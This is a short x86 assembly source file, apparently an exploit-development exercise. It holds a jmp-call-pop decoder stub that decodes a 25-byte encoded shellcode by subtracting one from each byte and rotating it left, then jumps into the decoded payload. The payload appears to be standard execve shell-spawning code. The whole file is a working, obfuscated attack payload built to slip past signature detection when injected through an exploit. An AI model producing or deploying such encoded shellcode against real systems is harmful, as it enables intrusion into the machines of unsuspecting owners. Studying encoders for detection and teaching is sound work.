global _start

section .text

_start:


	jmp short call_shellcode			; jumps to call_shellcode function

decode:
	pop esi								; shellcode from stack is placed in esi regsiter as reference
	xor ecx, ecx						; zero out ecx register			
	mov cl, 25							; this acts as a counter (25 is the length of the shellcode)


decoder:

	sub byte [esi], 0x01				; substract 1 from each byte value in esi regsiter
	rol byte [esi], 0x2 ; 				;rotate twice to left
	inc esi								; increment esi
	loop decoder						; loop  
	jmp short ror_shellcode				; jmp to the decoded shellcode

call_shellcode:

	call decode					; call decode function and below shellcode is pushed onto stack
	ror_shellcode: db 0x4d, 0x31, 0x15, 0x1b, 0xcc, 0xcc, 0xdd, 0x1b, 0x1b, 0xcc, 0x99, 0x5b, 0x9c, 0x63, 0xf9, 0x15, 0x63, 0xb9, 0xd5, 0x63, 0x79, 0x2d, 0xc3, 0x74, 0x21


